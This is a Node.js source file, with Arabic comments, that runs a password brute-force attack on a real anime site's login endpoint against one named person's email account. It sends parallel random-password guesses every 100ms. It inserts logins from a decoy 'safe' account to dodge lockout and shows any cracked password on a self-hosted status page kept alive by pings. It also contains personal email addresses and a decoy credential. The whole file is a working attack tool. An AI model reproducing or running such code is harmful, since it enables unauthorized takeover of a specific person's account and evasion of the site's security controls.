const express = require("express");
const axios = require("axios");
const app = express();

const targetEmail = "abrheem16@gmail.com";
const safeEmail = "goog1412123@gmail.com";
const safePassword = "goog";

let foundPassword = null;
let finished = false;
let currentTry = "";
let allPasswords = [];
let currentIndex = 0;
const parallelCount = 10;
let failCount = 0;
const retryLimit = 3;

function isRetryableError(error) {
  return (
    error.code === "ECONNABORTED" ||
    error.code === "ECONNRESET" ||
    error.response?.status === 502 ||
    error.response?.status === 503 ||
    error.response?.status === 504
  );
}

async function login(email, password, isSafe = false, attempt = 1) {
  try {
    const response = await axios.post(
      "https://app.sanime.net/function/h10.php?page=login",
      new URLSearchParams({ email, password }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
          Connection: "keep-alive",
        },
        timeout: 8000,
      }
    );

    const data = response.data;
    console.log(`🧪 تجربة: ${email} | ${password}`);
    console.log("📨 الرد:", data);

    if (!isSafe) {
      if (typeof data === "object" && data.code === "1") {
        foundPassword = password;
        finished = true;
        console.log(`✅ كلمة المرور الصحيحة: ${password}`);
      } else {
        failCount++;
      }
    }
  } catch (error) {
    if (isRetryableError(error) && attempt < retryLimit && !foundPassword && !finished) {
      console.log(`🔁 إعادة المحاولة (${attempt}) لكلمة: ${password}`);
      await login(email, password, isSafe, attempt + 1);
    } else {
      console.log(`❌ فشل: ${password} - ${error.message || error.code}`);
    }
  }
}

async function bruteForceStart() {
  const interval = setInterval(async () => {
    if (finished) {
      clearInterval(interval);
      return;
    }

    const batch = [];
    for (let i = 0; i < parallelCount; i++) {
      if (failCount > 0 && failCount % 4 === 0) {
        batch.push(login(safeEmail, safePassword, true));
        failCount = 0;
      } else {
        const pwd = generatePassword();
        allPasswords.push(pwd);
        currentTry = pwd;
        batch.push(login(targetEmail, pwd));
      }
    }

    await Promise.all(batch);
  }, 100); // كل 100ms = سرعة عالية جدًا
}

app.get("/", (req, res) => {
  const html = `
    <html>
      <head><meta http-equiv="refresh" content="5"><title>Status</title></head>
      <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
        <h1>🔐 كلمة المرور:</h1>
        ${
          foundPassword
            ? `<h2 style="color:#0f0">${foundPassword}</h2>`
            : finished
            ? `<h2 style="color:orange">❌ انتهى التجريب بدون نتيجة</h2>`
            : `<h2>جاري التجريب... 🌀</h2><h3>🔍 الآن: ${currentTry}</h3>`
        }
        <p style="color:#888">📡 https://noon-9v11.onrender.com/</p>
      </body>
    </html>`;
  res.send(html);
});

function generatePassword() {
  const charset = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const numDigits = Math.floor(Math.random() * 4); // 0-3 أرقام
  const numLetters = 8 - numDigits;

  let pass = "";
  for (let i = 0; i < numLetters; i++) {
    pass += charset[Math.floor(Math.random() * charset.length)];
  }
  for (let i = 0; i < numDigits; i++) {
    pass += digits[Math.floor(Math.random() * digits.length)];
  }
  return pass.split("").sort(() => Math.random() - 0.5).join("");
}

bruteForceStart();

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});

// Keep-alive
setInterval(() => {
  axios.get("https://noon-9v11.onrender.com/").catch(() => {});
}, 2 * 60 * 1000);
